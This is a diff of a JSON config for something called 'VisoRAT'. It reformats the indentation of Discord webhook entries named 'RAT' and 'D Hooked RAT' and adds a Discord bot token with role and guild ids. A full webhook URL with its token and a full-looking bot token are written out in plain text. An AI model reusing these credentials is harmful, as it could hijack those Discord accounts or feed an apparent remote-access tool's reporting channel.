@@ -12,14 +12,14 @@
                     "name": "D Hooked RAT",
                     "footer": "VisoRAT",
                     "color": 7414964,
-					"avatar_url": "https://bigrat.monster/media/bigrat.jpg"
+                    "avatar_url": "https://bigrat.monster/media/bigrat.jpg"
                 },
                 {
                     "url": "https://discord.com/api/webhooks/1436062658410319972/ZJlnWuxEbQ1bBbLGFhH8lrKQjob7UFTOLWbJ4tJoH_3yHOinBRwjul-ixCSKgLIi40ft", 
                     "name": "RAT",
                     "footer": "VisoRAT",
                     "color": 7414964,
-					"avatar_url": "https://bigrat.monster/media/bigrat.jpg"
+                    "avatar_url": "https://bigrat.monster/media/bigrat.jpg"
                 }
             ]
         },
@@ -30,12 +30,14 @@
                     "name": "Not D Hooked RAT",
                     "footer": "VisoRAT",
                     "color": 7414964,
-					"avatar_url": "https://bigrat.monster/media/bigrat.jpg"
+                    "avatar_url": "https://bigrat.monster/media/bigrat.jpg"
                 }
             ]
         }
+    },
+    "discord": {
+        "bot_token": "MTQzNjEyMjEzODgzMzU4ODI3NA.GIsLJQ.WSk39fLzWNOPBfxcXjRq3uNptf1GvLQa40uj38",
+        "admin_role_id": 1435717687321034945,
+        "guild_id": 1435699690048848016
     }
-
 }
-
-
